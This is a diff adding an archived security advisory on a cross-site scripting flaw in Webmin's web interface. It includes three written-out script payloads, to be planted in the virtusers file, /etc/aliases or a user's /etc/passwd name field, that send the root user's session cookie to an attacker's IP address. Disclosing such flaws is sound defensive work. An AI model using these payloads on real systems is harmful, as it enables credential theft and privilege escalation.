@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/4329/info
+
+Webmin is a web-based interface for system administration of Unix and Linux operating systems.
+
+Webmin does not filter script code from output that may be displayed by the web interface, such as log files, etc. This may enable a local attacker, with write privileges to such files, to cause arbitrary script code to be executed by the root user. Additionally, an attacker who can contrive a way to inject malicious script code into other types of output displayed by the Webmin interface may also exploit this issue.
+
+This may enable the attacker to steal cookie-based authentication credentials from the root user, eventually resulting in an escalation of privileges for the local attacker. 
+
+Insert the following line into the virtusers file, and wait for the root
+user to visit that page:
+</tt></a></td><tt><td><script>/* */document.write('<img
+src="http://192.168.40.1/'+document.cookie+'">');</script>
+
+Or the following into the /etc/aliases file:
+</a></td><td><tt><script>zz=unescape("%20");document.write('<img'/*:
+*/+zz+'src="http://10.1.1.33/'+document.cookie+'">');</script>
+
+Potentially more likely to be exploited however, would be a malicious
+local user who has _no_ access to webmin, who could change a file that
+webmin views through the HTML
+interface (where the code being read in is not checked for HTML). An
+example would be changing their
+'real name' in /etc/passwd to be something along the lines of:
+<script>zz=unescape("%3A");document.write('<img
+src="http'+zz+'//10.1.1.33/'+document.cookie+'">');</script>
+(Although chfn doesn't let you specify a username this long, but you get
+the idea.)
+
